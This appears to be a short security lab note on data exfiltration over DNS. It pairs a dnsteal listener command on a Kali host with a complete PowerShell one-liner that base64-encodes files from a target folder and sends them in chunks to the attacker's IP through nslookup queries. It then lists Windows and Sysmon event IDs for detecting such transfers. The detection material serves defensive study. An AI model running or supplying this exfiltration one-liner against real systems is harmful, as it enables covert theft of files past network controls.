
```kali
python2.7 dnsteal.py 192.168.100.2

```



```target
$d="192.168.100.2"; $s=4; $b=57; Get-ChildItem "C:\Users\Administ
rator\Desktop\Invoke-DNSteal-main\info" | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName);
$e = [System.Convert]::ToBase64String($z); $l=$e.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt
 $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + "-."; if (($n%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; $r="" }
 $n=$n+1 } nslookup -type=A $r$a. $d }
```

Windows Event Viewer:

- Event ID 5156 (Windows Server 2008 and later): The Windows Filtering Platform has permitted a connection, which could indicate an adversary transferring data in small chunks to avoid detection.
    
- Event ID 5155 (Windows Server 2008 and later): The Windows Filtering Platform has blocked a connection, which could indicate an adversary attempting to transfer data exceeding size limits.
    

Sysmon:

- Event ID 3 - Network connections: Monitor for network connections with small data transfer sizes or unusual connection patterns, especially those originating from unexpected or unauthorized sources, which could indicate an adversary attempting to exfiltrate data while avoiding data transfer size limits.
    
- Event ID 10 - Process accessed: Monitor for processes accessing network-related processes or services, such as file transfer clients or browsers, especially those with unusual command-line arguments or suspicious behaviors, which could indicate an adversary attempting to circumvent data transfer size restrictions.